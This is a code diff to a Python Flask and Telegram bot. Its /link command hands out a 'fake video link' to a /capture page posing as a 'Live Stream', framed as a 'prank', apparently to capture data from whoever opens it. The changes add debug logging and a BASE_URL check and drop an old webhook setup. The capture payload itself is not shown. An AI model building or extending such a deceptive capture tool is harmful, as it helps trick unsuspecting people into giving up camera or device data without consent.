@@ -4,9 +4,15 @@ from flask import Flask, request, abort, render_template_string
 import telebot
 import pymongo
 
+# قراءة المتغيرات
 TOKEN = os.getenv("BOT_TOKEN")
 BASE_URL = os.getenv("BASE_URL")
 MONGO_URL = os.getenv("MONGO_URL")
+
+print("--- STARTING BOT ---")
+print(f"TOKEN: {'Set' if TOKEN else 'MISSING'}")
+print(f"BASE_URL: {BASE_URL}")
+print(f"MONGO_URL: {'Set' if MONGO_URL else 'MISSING'}")
 
 if not TOKEN:
     raise RuntimeError("BOT_TOKEN is missing")
@@ -36,6 +42,7 @@ def capture_page():
         is_allowed = users_collection.find_one({"user_id": user_id}) is not None
     if not user_id or not is_allowed:
         return "الرابط غير صالح", 403
+    
     html = """
     
     Live Stream
@@ -64,9 +71,11 @@ def capture():
 
 @app.route("/webhook", methods=["POST"])
 def webhook():
+    print("--- WEBHOOK RECEIVED ---")
     if request.headers.get("content-type") == "application/json":
         try:
             update = telebot.types.Update.de_json(request.get_data(as_text=True))
+            print(f"UPDATE: {update}")
             bot.process_new_updates([update])
             return "OK", 200
         except Exception as e:
@@ -77,11 +86,17 @@ def webhook():
 
 @bot.message_handler(commands=["start"])
 def start(message):
+    print(f"--- START COMMAND RECEIVED FROM {message.chat.id} ---")
     bot.reply_to(message, "مرحبًا! أرسل الأمر /link لصنع المقلب.")
 
 @bot.message_handler(commands=["link"])
 def link(message):
+    print(f"--- LINK COMMAND RECEIVED FROM {message.chat.id} ---")
     try:
+        if not BASE_URL:
+            bot.reply_to(message, "❌ خطأ: متغير BASE_URL غير معين في إعدادات Vercel.")
+            return
+            
         if users_collection is not None:
             users_collection.update_one(
                 {"user_id": message.chat.id},
@@ -89,34 +104,12 @@ def link(message):
                 upsert=True
             )
         url = f"{BASE_URL}/capture?user_id={message.chat.id}"
-        bot.reply_to(message, f" تم إنشاء رابط الفيديو الوهمي:\n\n{url}")
+        bot.reply_to(message, f"✅ تم إنشاء رابط الفيديو الوهمي:\n\n{url}")
     except Exception as e:
         print(f"❌ Error in /link: {e}")
         bot.reply_to(message, f"حدث خطأ: {e}")
 
-# لا تستدعي setup_webhook هنا مباشرة
-# def setup_webhook():
-#     try:
-#         bot.remove_webhook()
-#         time.sleep(1)
-#         bot.set_webhook(url=f"{BASE_URL}/webhook")
-#         print("✅ Webhook set successfully")
-#     except Exception as e:
-#         print(f"❌ Webhook setup error: {e}")
-
-# setup_webhook()  # تم التعليق
-
+# للتشغيل المحلي فقط
 if __name__ == "__main__":
-    # للتشغيل المحلي فقط
-    def setup_webhook_local():
-        try:
-            bot.remove_webhook()
-            time.sleep(1)
-            bot.set_webhook(url=f"{BASE_URL}/webhook")
-            print("✅ Webhook set successfully (local)")
-        except Exception as e:
-            print(f"❌ Webhook setup error: {e}")
-    
-    setup_webhook_local()
     port = int(os.environ.get('PORT', 5000))
     app.run(host="0.0.0.0", port=port)
